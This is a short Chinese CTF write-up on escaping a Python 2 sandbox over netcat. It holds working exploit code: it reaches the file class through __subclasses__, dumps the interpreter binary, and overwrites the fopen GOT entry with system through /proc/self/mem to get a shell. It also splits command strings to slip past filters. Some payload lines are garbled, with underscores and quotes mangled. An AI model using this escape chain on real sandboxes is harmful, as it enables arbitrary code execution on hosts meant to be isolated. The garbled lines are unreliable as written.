# Run1

## 解题思路

> nc连上得知是一个python环境沙箱,是要逃逸getshell.

> 上来一通fuzz之后,发现七七八八的全部被ban,而通过()基类中的file 可以进行文件读取

> 通过('/usr/bin/python','r').read()把python进程dump下来

```
echo "print ().__class__.__bases__[0].__subclasses__()[40]('/usr/bin/python','r').read()"|nc 127.0.0.1 9999 > python
```

> 修复下dump下来的elf文件,objdump分析下

```
objdump -R python|grep -E "system|fopen"
```

> 读取system地址将其写入fopen中,调用fopen即可getshell,还有cat and ls的命令绕过

```
(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().class.bases[0].subclasses()[40]( "l'+'s"))(().class.bases[0].subclasses()[40]( "/proc/self/mem','r"),().class.bases[0].subclasses()[40]( "/proc/self/mem', 'w', 0\)\)

5c72a1d444cf3121a5d25f2db4147ebb

bin

cpython.py

cpython.pyc

sandbox.py

\(lambda r,w:r.seek\(0x08de2b8\) or w.seek\(0x08de8c8\) or w.write\(r.read\(8\)\) or \(\).__class__.__bases__\[0\].__subclasses__\(\)\[40\]\('c'+'at5c72a1d444cf3121a5d25f2db4147ebb"))(().class.bases[0].subclasses()[40]("/proc/self/mem','r"),().class.bases[0].subclasses()[40]('/proc/self/mem', 'w', 0))


flag{eee93c33d97aa55f785a7d10ba4ae3ce}
```

## flag

> flag{eee93c33d97aa55f785a7d10ba4ae3ce}
